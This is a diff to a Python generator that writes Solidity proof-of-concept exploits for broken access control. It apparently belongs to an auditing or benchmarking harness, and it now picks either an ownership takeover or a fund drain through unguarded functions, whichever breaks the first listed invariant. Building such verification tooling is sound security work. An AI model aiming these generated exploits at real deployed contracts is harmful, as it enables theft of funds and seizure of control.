@@ -104,11 +104,26 @@ def _reentrancy(findings):
 def _access(findings):
     drain = findings.get("access_drain")
     setowner = findings.get("access_setowner")
+    predicates = [str(p).lower() for p in findings.get("invariant_predicates", [])]
+    first_predicate = predicates[0] if predicates else ""
+
+    # Prefer the shortest action that directly breaks the first ordered
+    # predicate.  checkAll reports that predicate first, so performing both an
+    # ownership takeover and a drain only makes the PoC larger and adds another
+    # possible revert without strengthening the proof.
+    use_setowner = bool(setowner)
+    use_drain = bool(drain)
+    if setowner and ("owner" in first_predicate or "admin" in first_predicate):
+        use_drain = False
+    elif drain and any(k in first_predicate for k in
+                       ("solvent", "balance", "reserve", "fund")):
+        use_setowner = False
+
     lines = []
     ifaces = []
-    if setowner:
+    if use_setowner:
         ifaces.append(f"    function {setowner['name']}(address newOwner) external;")
-    if drain:
+    if use_drain:
         # signature: figure out arg order (address to, uint amount) heuristically
         args = drain["args"]
         addr_first = args and args[0][0] == "address"
@@ -121,20 +136,21 @@ def _access(findings):
         else:
             ifaces.append(f"    function {drain['name']}() external;")
             lines.append(f"        t.{drain['name']}();")
-    if setowner:
+    if use_setowner:
         lines.insert(0, f"        t.{setowner['name']}(address(this));")
     if not lines:
         return None
+    receive = "    receive() external payable {}\n" if use_drain else ""
     body = (
-        "// Strategy: broken access control — call the unguarded privileged\n"
-        "// function(s) directly to seize ownership and/or drain the vault.\n"
+        "// Strategy: broken access control — make the shortest unguarded call\n"
+        "// that violates the first invariant selected by the manifest.\n"
         "interface ITarget {\n" + "\n".join(ifaces) + "\n}\n\n"
         "contract Exploit {\n"
         "    function run(address _t) external payable {\n"
         "        ITarget t = ITarget(_t);\n"
         + "\n".join(lines) + "\n"
         "    }\n"
-        "    receive() external payable {}\n"
+        + receive +
         "}\n"
     )
     return HEADER + body
